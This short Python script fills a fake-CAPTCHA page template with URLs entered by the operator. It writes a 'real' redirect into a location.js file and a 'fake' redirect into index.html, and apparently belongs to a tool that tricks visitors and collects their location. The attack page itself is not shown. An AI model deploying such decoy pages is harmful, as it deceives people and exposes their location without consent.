#!/usr/bin/env python3

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')

with open('template/captcha/js/location_temp.js', 'r') as location_temp:
    js_file = location_temp.read()
    updated_js_raw = js_file.replace('REDIRECT_URL', real_forward)

with open('template/captcha/js/location.js', 'w') as updated_js:
    updated_js.write(updated_js_raw)

with open('template/captcha/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    upd_temp_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', fake_forward)

with open('template/captcha/index.html', 'w') as updated_index:
    updated_index.write(upd_temp_index_raw)